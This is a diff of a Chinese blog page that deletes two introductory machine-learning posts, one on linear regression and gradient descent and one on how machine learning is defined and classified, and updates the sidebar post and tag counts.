-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/20/机机器学习-2-——线性回归/" itemprop="url">
-                  机器学习(2)——线性回归
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-20T12:44:06+08:00">
-                2018-06-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/20/机机器学习-2-——线性回归/" class="leancloud_visitors" data-flag-title="机器学习(2)——线性回归">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一篇记录了机器学习的定义、分类和范围，这一篇开始从机器学习的方法学起，总结机器学习的经典方法，然后尽量自己写代码实现。</p>
-<h2 id="0x01-回归算法"><a href="#0x01-回归算法" class="headerlink" title="0x01 回归算法"></a>0x01 回归算法</h2><p>回归算法属于机器学习中监督学习类的算法，是入门机器学习最基础的算法。</p>
-<p>回归分析是研究自变量和因变量之间关系的一种预测模型技术。这些技术应用于预测，时间序列模型和找到变量之间关系。</p>
-<p>回归算法就是量化因变量受自变量影响的大小，建立线性回归方程或者非线性回归方程，从而达对因变量的预测，或者对因变量的解释作用。</p>
-<h2 id="0x02-回归分析流程"><a href="#0x02-回归分析流程" class="headerlink" title="0x02 回归分析流程"></a>0x02 回归分析流程</h2><p>①探索性分析，画不同变量之间的散点图，进行相关性检验等，了解数据的大致情况，以及得知重点关注那几个变量；</p>
-<p>②变量和模型选择；</p>
-<p>③回归分析假设条件验证；</p>
-<p>④共线性和强影响点检查；</p>
-<p>⑤模型修改，并且重复③④；</p>
-<p>⑥模型验证。</p>
-<h2 id="0x03-回归算法分类"><a href="#0x03-回归算法分类" class="headerlink" title="0x03 回归算法分类"></a>0x03 回归算法分类</h2><p>回归算法主要通过三种方法分类：自变量的个数、因变量的类型和回归线的形状。</p>
-<p>常见的回归算法有：</p>
-<ul>
-<li>线性回归</li>
-<li>逻辑回归</li>
-<li>多项式回归</li>
-<li>逐步回归</li>
-<li>岭回归</li>
-<li>Lasso回归</li>
-<li>ElasticNet回归</li>
-</ul>
-<h2 id="0x04-线性回归-Linear-Regression"><a href="#0x04-线性回归-Linear-Regression" class="headerlink" title="0x04 线性回归(Linear Regression)"></a>0x04 线性回归(Linear Regression)</h2><p>线性回归是世界上最知名的建模方法之一，在线性回归模型中，因变量是连续型的，自变量可以使连续型或离散型的，回归线是线性的。</p>
-<p>线性回归用最适直线(回归线)去建立因变量Y和一个或多个自变量X之间的关系。可以用公式来表示：</p>
-<p>Y=A+B*X+e</p>
-<p>A为截距，B为回归线的斜率，e是误差项。</p>
-<p>简单线性回归与多元线性回归的差别在于：多元线性回归有多个(&gt;1)自变量，而简单线性回归只有一个自变量。</p>
-<h4 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h4><p>我们首先实现一个只有单一自变量的简单线性回归</p>
-<p>我们实现这个算法，可以先以Andrew Ng机器学习讲义中美国俄亥俄州Portland Oregon城市房屋价格为例：</p>
-<p>这个例子中近简化使用房屋面积一个因子作为自变量，y轴对应其因变量房屋价格。所以我们机器学习的线性回归就变为对于给定有限的数据集，进行一元线性回归，即找到一个一次函数y=y(x) + e，使得y满足</p>
-<p>当x={2104, 1600, 2400, 1416, 3000, … }, y={400, 330, 369, 232, 540, … } </p>
-<table>
-<thead>
-<tr>
-<th>面积(feet²)</th>
-<th>价格(1000$)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>2104</td>
-<td>400</td>
-</tr>
-<tr>
-<td>1600</td>
-<td>330</td>
-</tr>
-<tr>
-<td>2400</td>
-<td>369</td>
-</tr>
-<tr>
-<td>1416</td>
-<td>232</td>
-</tr>
-<tr>
-<td>3000</td>
-<td>540</td>
-</tr>
-<tr>
-<td>···</td>
-<td>···</td>
-</tr>
-</tbody>
-</table>
-<p>对这个问题我们先给出假设函数即需要拟合的直线：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_01.png?raw=true" alt=""></p>
-<p>其中a和b是我们要求得的参数，参数得变化会引起函数的变化。</p>
-<p>而我们解出参数之后的函数是否为最优解，我们需要引入一个概念：Cost Function，即代价函数或成本函数。</p>
-<h4 id="代价函数-Cost-Function"><a href="#代价函数-Cost-Function" class="headerlink" title="代价函数(Cost Function)"></a>代价函数(Cost Function)</h4><p>在回归问题中，衡量最优解的常用代价函数为平方误差。</p>
-<p>平方误差在高中和大学的概率论、统计学等课程中我们都有所了解，就是用样本数据和拟合出的线做差值，然后对差值进行平方和并除以点数m计算平均值。</p>
-<p>而在这里，我们要导出代价函数，额外除以1/2做数学简化，形成以下代价函数：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_02.png?raw=true" alt=""></p>
-<p>ps：这里额外除以1/2，是为了之后平方函数的微分项将抵消1/2项，以方便计算梯度下降。</p>
-<p>下来我们求解最优解的问题就转变为了求解代价函数的最小值。</p>
-<p>其中J是基于θ的函数，我们可以先将其简化成只有θ1的函数，令θ0=0.</p>
-<p>然后我们不断给定θ1的值，基于样本值进行计算代价函数J，就可以得到一个θ1和J的函数，并在某一点取得极小值。</p>
-<p>如样本数据为y ={(1,1), (2,2),(3,3)}时，可以得到如下的J-θ1图形：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_03.png?raw=true" alt=""></p>
-<p>我们求解线性回归最优解的方法一般是梯度下降法和最小二乘法</p>
-<h4 id="最小二乘法"><a href="#最小二乘法" class="headerlink" title="最小二乘法"></a>最小二乘法</h4><p>代价函数中使用的均方误差，其实对应了我们常用的欧几里得的距离（欧式距离，Euclidean Distance）, 基于均方误差最小化进行模型求解的方法称为“最小二乘法”（least square method），即通过最小化误差的平方和寻找数据的最佳函数匹配。</p>
-<p>当函数子变量为一维时，最小二乘法就蜕变成寻找一条直线。</p>
-<p>如我们上例中的模型，寻找J极小值就是分别用J对θ1和θ0求偏导，然后寻找偏导为零的点。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_04.png?raw=true" alt=""></p>
-<p>解得：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_05.png?raw=true" alt=""></p>
-<h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><p>最小二乘法算法简单，容易理解，而然在现实机器学习却有其局限性：</p>
-<ul>
-<li><p>并非所有函数都可以求出驻点，即导数为0的点，f(x)=0</p>
-</li>
-<li><p>求解方程困难，或求根公式复杂</p>
-</li>
-<li><p>导数并无解析解</p>
-</li>
-<li><p>最小二乘法的矩阵公式,计算一个矩阵的逆是相当耗费时间的, 而且求逆也会存在数值不稳定的情况</p>
-</li>
-</ul>
-<h4 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h4><p>正是由于在实际中，最小二乘法遇到的困难和局限性，尤其是多数超定方程组不存在解，我们由求导转向迭代逼近。也就是梯度下降算法。</p>
-<p>首先我们了解一下什么是梯度，这在复变函数等大学课程中都曾经学过。</p>
-<h5 id="方向导数"><a href="#方向导数" class="headerlink" title="方向导数"></a>方向导数</h5><p>方向导数即研究在某一点的任意方向的变化率，是偏导数的广义扩展。</p>
-<h5 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h5><p>梯度则基于方向导数，是一个向量而非数，梯度代表了各个方向导数中，变化趋势最大的那个方向。</p>
-<p>那么，梯度方向就是增长最快的方向，负梯度方向就是减小最快的方向。</p>
-<h5 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a>梯度下降算法</h5><p>梯度下降算法通常也被称作最速下降法。其目的是找到一个局部极小值点；其目标与最小二乘法相同，都是使得估算值与实际值的总平方差尽量小。</p>
-<p>其方法是采用计算数学的迭代法，先给定一初始点，然后向下降最快的方向调整，在若干次迭代之后找到局部最小。</p>
-<p>比如我们给定上面的方程，初始参数是θ0,θ1，我们不断改变θ0,θ1从而减少J(θ0,θ1)的值，具体做法是求导。直到最终收敛。</p>
-<p>迭代公式如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_06.png?raw=true" alt=""></p>
-<p>其中θj可以是θ0和θ1这两个参数，α为步长，整个式子的意义为，θ0,θ1每次向J(θ0,θ1)负梯度方向下降步长α。</p>
-<h5 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h5><p>公式中的步长α，也称为学习率，用来控制每次下降的幅度。</p>
-<p>我们应该调整参数α以确保梯度下降算法在合理的时间内收敛。</p>
-<ul>
-<li>如果α过小，每步会移动非常近，收敛时间就会很长。</li>
-<li>如果α过大，每步会移动比较远，会导致直接越过极小值，甚至无法收敛到最低点。</li>
-</ul>
-<p>如果我们时间耗费较长或无法收敛，那就说明我们要重新制定学习率α。</p>
-<h5 id="线性回归梯度下降"><a href="#线性回归梯度下降" class="headerlink" title="线性回归梯度下降"></a>线性回归梯度下降</h5><p>对于线性模型，我们可以这样写梯度下降函数。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_07.png?raw=true" alt=""></p>
-<p>h(x)是需要拟合的函数。<br>J(θ)称为均方误差或cost function。用来衡量训练集众的样本对线性模式的拟合程度。<br>m为训练集众样本的个数。<br>θ是我们最终需要通过梯度下降法来求得的参数。</p>
-<p>接下来的梯度下降法就有两种不同的迭代思路。</p>
-<h5 id="批量梯度下降（Batch-Gradient-Descent）"><a href="#批量梯度下降（Batch-Gradient-Descent）" class="headerlink" title="批量梯度下降（Batch Gradient Descent）"></a>批量梯度下降（Batch Gradient Descent）</h5><p>可以看到上述每次迭代都需要计算所有样本的残差并加和，批量梯度下降是梯度下降法最原始的形式，它的具体思路是在更新每一参数时都使用所有的样本来进行更新。</p>
-<p>1.计算J(θ)关于θT的偏导数,也就得到了向量中每一个θ的梯度。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_08.png?raw=true" alt=""></p>
-<p>2.沿着梯度的反方向更新参数θ的值</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_09.png?raw=true" alt=""></p>
-<p>3.迭代直到收敛。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_10.png?raw=true" alt=""></p>
-<ul>
-<li><p>优点：全局最优解，易于并行实现。</p>
-</li>
-<li><p>缺点：当样本数目很多时，训练过程会很慢。</p>
-</li>
-</ul>
-<h5 id="随机梯度下降（Stochastic-gradient-descent）"><a href="#随机梯度下降（Stochastic-gradient-descent）" class="headerlink" title="随机梯度下降（Stochastic gradient descent）"></a>随机梯度下降（Stochastic gradient descent）</h5><p>和批量梯度有所不同的地方在于，每次迭代只选取一个样本的数据，一旦到达最大的迭代次数或是满足预期的精度，就停止。</p>
-<p>随机梯度下降法的θ更新表达式。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_11.png?raw=true" alt=""></p>
-<p>迭代直到收敛。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_12.png?raw=true" alt=""></p>
-<ul>
-<li><p>优点：训练速度快。</p>
-</li>
-<li><p>缺点：准确度下降，并不是全局最优，不易于并行实现。</p>
-</li>
-</ul>
-<h5 id="视觉效果"><a href="#视觉效果" class="headerlink" title="视觉效果"></a>视觉效果</h5><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml2_13.png?raw=true" alt=""></p>
-<p>当我们的成本函数处于图的坑底时，J值最小，为最佳解。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/19/机器学习-1-——定义与分类/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/19/机器学习-1-——定义与分类/" itemprop="url">
-                  机器学习(1)——定义与分类
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-19T18:43:03+08:00">
-                2018-06-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/19/机器学习-1-——定义与分类/" class="leancloud_visitors" data-flag-title="机器学习(1)——定义与分类">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>因为假期实习能选择的安全项目大部分都要用到机器学习，而自己对这个领域缺乏了解，所以准备用一段时间专心学习一下。</p>
-<h2 id="0x01-机器学习-Machine-Learning"><a href="#0x01-机器学习-Machine-Learning" class="headerlink" title="0x01 机器学习(Machine Learning)"></a>0x01 机器学习(Machine Learning)</h2><p>机器学习在不同的领域和不同的学者中有着不同的定义，我认为Alpaydin的定义更偏向于现代机器学习的核心内容：“机器学习是用数据或以往的经验，以此优化计算机程序的性能标准。”(Machine learning is programming computers to optimize a performance criterion using example data or past experience.)</p>
-<p>也就是说，机器学习方法是计算机利用已有的数据，得出了某种模型，并利用此模型预测未来的一种方法。</p>
-<p>机器学习与人类思考的对比：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml1_01.png?raw=true" alt=""></p>
-<h2 id="0x02-按照学习策略分类"><a href="#0x02-按照学习策略分类" class="headerlink" title="0x02 按照学习策略分类"></a>0x02 按照学习策略分类</h2><p>机器学习的学习策略指学习过程中系统所采用的推理策略。按照学习策略可以将机器学习分为下列几类：</p>
-<h4 id="1-机械学习-Rote-learning"><a href="#1-机械学习-Rote-learning" class="headerlink" title="(1)机械学习 (Rote learning)"></a>(1)机械学习 (Rote learning)</h4><p>学习者无需任何推理或其它的知识转换，直接吸取环境所提供的信息。如塞缪尔的跳棋程序，纽厄尔和西蒙的LT系统。这类学习系统主要考虑的是如何索引存贮的知识并加以利用。系统的学习方法是直接通过事先编好、构造好的程序来学习，学习者不作任何工作，或者是通过直接接收既定的事实和数据进行学习，对输入信息不作任何的推理。</p>
-<h4 id="2-示教学习-Learning-from-instruction"><a href="#2-示教学习-Learning-from-instruction" class="headerlink" title="(2)示教学习 (Learning from instruction)"></a>(2)示教学习 (Learning from instruction)</h4><p>学生从环境（教师或其它信息源如教科书等）获取信息，把知识转换成内部可使用的表示形式，并将新的知识和原有知识有机地结合为一体。所以要求学生有一定程度的推理能力，但环境仍要做大量的工作。教师以某种形式提出和组织知识，以使学生拥有的知识可以不断地增加。这种学习方法和人类社会的学校教学方式相似，学习的任务就是建立一个系统，使它能接受教导和建议，并有效地存贮和应用学到的知识。不少专家系统在建立知识库时使用这种方法去实现知识获取。示教学习的一个典型应用例是FOO程序。</p>
-<h4 id="3-演绎学习-Learning-by-deduction"><a href="#3-演绎学习-Learning-by-deduction" class="headerlink" title="(3)演绎学习 (Learning by deduction)"></a>(3)演绎学习 (Learning by deduction)</h4><p>学生所用的推理形式为演绎推理。推理从公理出发，经过逻辑变换推导出结论。这种推理是”保真”变换和特化(specialization)的过程，使学生在推理过程中可以获取有用的知识。这种学习方法包含宏操作(macro-operation)学习、知识编辑和组块(Chunking)技术。演绎推理的逆过程是归纳推理。</p>
-<h4 id="4-类比学习-Learning-by-analogy"><a href="#4-类比学习-Learning-by-analogy" class="headerlink" title="(4)类比学习 (Learning by analogy)"></a>(4)类比学习 (Learning by analogy)</h4><p>利用二个不同领域（源域、目标域）中的知识相似性，可以通过类比，从源域的知识（包括相似的特征和其它性质）推导出目标域的相应知识，从而实现学习。类比学习系统可以使一个已有的计算机应用系统转变为适应于新的领域，来完成原先没有设计的相类似的功能。</p>
-<h4 id="5-基于解释的学习-Explanation-based-learning-EBL"><a href="#5-基于解释的学习-Explanation-based-learning-EBL" class="headerlink" title="(5)基于解释的学习 (Explanation-based learning, EBL)"></a>(5)基于解释的学习 (Explanation-based learning, EBL)</h4><p>学生根据教师提供的目标概念、该概念的一个例子、领域理论及可操作准则，首先构造一个解释来说明为什该例子满足目标概念，然后将解释推广为目标概念的一个满足可操作准则的充分条件。EBL已被广泛应用于知识库求精和改善系统的性能。<br>著名的EBL系统有迪乔恩（G.DeJong）的GENESIS,米切尔（T.Mitchell）的LEXII和LEAP, 以及明顿（S.Minton）等的PRODIGY。</p>
-<h4 id="6-归纳学习-Learning-from-induction"><a href="#6-归纳学习-Learning-from-induction" class="headerlink" title="(6)归纳学习 (Learning from induction)"></a>(6)归纳学习 (Learning from induction)</h4><p>归纳学习是由教师或环境提供某概念的一些实例或反例，让学生通过归纳推理得出该概念的一般描述。这种学习的推理工作量远多于示教学习和演绎学习，因为环境并不提供一般性概念描述（如公理）。从某种程度上说，归纳学习的推理量也比类比学习大，因为没有一个类似的概念可以作为”源概念”加以取用。归纳学习是最基本的，发展也较为成熟的学习方法，在人工智能领域中已经得到广泛的研究和应用。</p>
-<h2 id="0x03-按照所获取知识的表示形式分类"><a href="#0x03-按照所获取知识的表示形式分类" class="headerlink" title="0x03 按照所获取知识的表示形式分类"></a>0x03 按照所获取知识的表示形式分类</h2><h4 id="1-代数表达式参数"><a href="#1-代数表达式参数" class="headerlink" title="(1)代数表达式参数"></a>(1)代数表达式参数</h4><p>学习的目标是调节一个固定函数形式的代数表达式参数或系数来达到一个理想的性能。</p>
-<h4 id="2-决策树"><a href="#2-决策树" class="headerlink" title="(2)决策树"></a>(2)决策树</h4><p>用决策树来划分物体的类属，树中每一内部节点对应一个物体属性，而每一边对应于这些属性的可选值，树的叶节点则对应于物体的每个基本分类。</p>
-<h4 id="3-形式文法"><a href="#3-形式文法" class="headerlink" title="(3)形式文法"></a>(3)形式文法</h4><p>在识别一个特定语言的学习中，通过对该语言的一系列表达式进行归纳，形成该语言的形式文法。</p>
-<h4 id="4-产生式规则"><a href="#4-产生式规则" class="headerlink" title="(4)产生式规则"></a>(4)产生式规则</h4><p>产生式规则表示为条件—动作对，已被极为广泛地使用。学习系统中的学习行为主要是：生成、泛化、特化（Specialization）或合成产生式规则。</p>
-<h4 id="5-形式逻辑表达式"><a href="#5-形式逻辑表达式" class="headerlink" title="(5)形式逻辑表达式"></a>(5)形式逻辑表达式</h4><p>形式逻辑表达式的基本成分是命题、谓词、变量、约束变量范围的语句，及嵌入的逻辑表达式。</p>
-<h4 id="6-图和网络"><a href="#6-图和网络" class="headerlink" title="(6)图和网络"></a>(6)图和网络</h4><p>有的系统采用图匹配和图转换方案来有效地比较和索引知识。</p>
-<h4 id="7-框架和模式（schema）"><a href="#7-框架和模式（schema）" class="headerlink" title="(7)框架和模式（schema）"></a>(7)框架和模式（schema）</h4><p>每个框架包含一组槽，用于描述事物（概念和个体）的各个方面。</p>
-<h4 id="8-计算机程序和其它的过程编码"><a href="#8-计算机程序和其它的过程编码" class="headerlink" title="(8)计算机程序和其它的过程编码"></a>(8)计算机程序和其它的过程编码</h4><p>获取这种形式的知识，目的在于取得一种能实现特定过程的能力，而不是为了推断该过程的内部结构。</p>
-<h4 id="9-神经网络"><a href="#9-神经网络" class="headerlink" title="(9)神经网络"></a>(9)神经网络</h4><p>这主要用在联接学习中。学习所获取的知识，最后归纳为一个神经网络。</p>
-<h4 id="10-多种表示形式的组合"><a href="#10-多种表示形式的组合" class="headerlink" title="(10)多种表示形式的组合"></a>(10)多种表示形式的组合</h4><p>有时一个学习系统中获取的知识需要综合应用上述几种知识表示形式。</p>
-<h2 id="0x04-按照学习形势分类"><a href="#0x04-按照学习形势分类" class="headerlink" title="0x04 按照学习形势分类"></a>0x04 按照学习形势分类</h2><h4 id="1-监督学习-supervised-learning"><a href="#1-监督学习-supervised-learning" class="headerlink" title="(1)监督学习(supervised learning)"></a>(1)监督学习(supervised learning)</h4><p>监督学习，即在机械学习过程中提供对错指示。一般实在是数据组中包含最终结果（0，1）。通过算法让机器自我减少误差。这一类学习主要应用于分类和预测 (regression &amp; classify)。监督学习从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。</p>
-<p>常见的监督学习算法：</p>
-<p>线性回归，逻辑回归，神经网络，SVM</p>
-<h4 id="2-非监督学习-unsupervised-learning"><a href="#2-非监督学习-unsupervised-learning" class="headerlink" title="(2)非监督学习(unsupervised learning)"></a>(2)非监督学习(unsupervised learning)</h4><p>非监督学习又称归纳性学习（clustering）利用K方式(Kmeans)，建立中心（centriole），通过循环和递减运算(iteration&amp;descent)来减小误差，达到分类的目的。</p>
-<p>常见的无监督学习算法：</p>
-<p>聚类算法，降维算法</p>
-<h2 id="0x05-机器学习的范围"><a href="#0x05-机器学习的范围" class="headerlink" title="0x05 机器学习的范围"></a>0x05 机器学习的范围</h2><h4 id="模式识别"><a href="#模式识别" class="headerlink" title="模式识别"></a>模式识别</h4><p>模式识别=机器学习。两者的主要区别在于前者是从工业界发展起来的概念，后者则主要源自计算机学科。在著名的《Pattern Recognition And Machine Learning》这本书中，Christopher M. Bishop在开头是这样说的“模式识别源自工业界，而机器学习来自于计算机学科。不过，它们中的活动可以被视为同一个领域的两个方面，同时在过去的10年间，它们都有了长足的发展”。</p>
-<h4 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h4><p>数据挖掘=机器学习+数据库。这几年数据挖掘的概念实在是太耳熟能详。几乎等同于炒作。但凡说数据挖掘都会吹嘘数据挖掘如何如何，例如从数据中挖出金子，以及将废弃的数据转化为价值等等。但是，我尽管可能会挖出金子，但我也可能挖的是“石头”啊。这个说法的意思是，数据挖掘仅仅是一种思考方式，告诉我们应该尝试从数据中挖掘出知识，但不是每个数据都能挖掘出金子的，所以不要神话它。一个系统绝对不会因为上了一个数据挖掘模块就变得无所不能(这是IBM最喜欢吹嘘的)，恰恰相反，一个拥有数据挖掘思维的人员才是关键，而且他还必须对数据有深刻的认识，这样才可能从数据中导出模式指引业务的改善。大部分数据挖掘中的算法是机器学习的算法在数据库中的优化。</p>
-<h4 id="统计学习"><a href="#统计学习" class="headerlink" title="统计学习"></a>统计学习</h4><p>统计学习近似等于机器学习。统计学习是个与机器学习高度重叠的学科。因为机器学习中的大多数方法来自统计学，甚至可以认为，统计学的发展促进机器学习的繁荣昌盛。例如著名的支持向量机算法，就是源自统计学科。但是在某种程度上两者是有分别的，这个分别在于：统计学习者重点关注的是统计模型的发展与优化，偏数学，而机器学习者更关注的是能够解决问题，偏实践，因此机器学习研究者会重点研究学习算法在计算机上执行的效率与准确性的提升。</p>
-<h4 id="计算机视觉"><a href="#计算机视觉" class="headerlink" title="计算机视觉"></a>计算机视觉</h4><p>计算机视觉=图像处理+机器学习。图像处理技术用于将图像处理为适合进入机器学习模型中的输入，机器学习则负责从图像中识别出相关的模式。计算机视觉相关的应用非常的多，例如百度识图、手写字符识别、车牌识别等等应用。这个领域是应用前景非常火热的，同时也是研究的热门方向。随着机器学习的新领域深度学习的发展，大大促进了计算机图像识别的效果，因此未来计算机视觉界的发展前景不可估量。</p>
-<h4 id="语音识别"><a href="#语音识别" class="headerlink" title="语音识别"></a>语音识别</h4><p>语音识别=语音处理+机器学习。语音识别就是音频处理技术与机器学习的结合。语音识别技术一般不会单独使用，一般会结合自然语言处理的相关技术。目前的相关应用有苹果的语音助手siri等。</p>
-<h4 id="自然语言处理"><a href="#自然语言处理" class="headerlink" title="自然语言处理"></a>自然语言处理</h4><p>自然语言处理=文本处理+机器学习。自然语言处理技术主要是让机器理解人类的语言的一门领域。在自然语言处理技术中，大量使用了编译原理相关的技术，例如词法分析，语法分析等等，除此之外，在理解这个层面，则使用了语义理解，机器学习等技术。作为唯一由人类自身创造的符号，自然语言处理一直是机器学习界不断研究的方向。按照百度机器学习专家余凯的说法“听与看，说白了就是阿猫和阿狗都会的，而只有语言才是人类独有的”。如何利用机器学习技术进行自然语言的的深度理解，一直是工业和学术界关注的焦点。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2743,7 +2663,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">111</span>
+                <span class="site-state-item-count">115</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2754,7 +2674,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-count">22</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2765,7 +2685,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">64</span>
+                <span class="site-state-item-count">68</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
